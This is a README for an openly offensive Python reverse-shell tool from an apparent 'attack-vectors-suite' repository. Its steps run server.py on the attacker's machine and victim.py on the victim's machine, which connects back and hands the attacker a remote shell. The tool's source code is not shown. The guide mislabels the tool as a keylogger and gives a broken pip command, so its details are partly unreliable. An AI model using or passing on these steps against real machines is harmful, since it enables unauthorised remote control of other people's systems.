# This is a Linux Reverse Shell in Python

The reverse shell has two files. The `server.py` needs to run on the attacker's machine to set up the server and start listening for connections while the `victim.py` needs to run on the victim's machine to connect to the attacker's machine.

## Steps to use this keylogger:
  1. Clone this repo:
```bash
git clone https://github.com/SANTHOSH17-DOT/attack-vectors-suite.git
```
  2. cd into the `REVERSESHELL` directory
```bash
cd attack-vectors-suite\REVERSESHELL
```
  3. run `pip install requirements.txt`
  4. run `python3 server.py 0.0.0.0 9999`
  * Once you press enter the server starts:
![server](https://user-images.githubusercontent.com/60394916/220286770-9a048bf1-2aad-496c-9ebe-d95fc293dc9d.PNG)

  5. run `python3 victim.py 0.0.0.0 9999` on another terminal:

![victim](https://user-images.githubusercontent.com/60394916/220286991-8641b75b-3d4e-421d-869e-f8ee177661bd.PNG)
  * Let's go back to the attacker's terminal and we should see a shell:

![server1](https://user-images.githubusercontent.com/60394916/220287544-2c4b5574-f780-4ed8-a28e-4bdef6a3ee17.PNG)
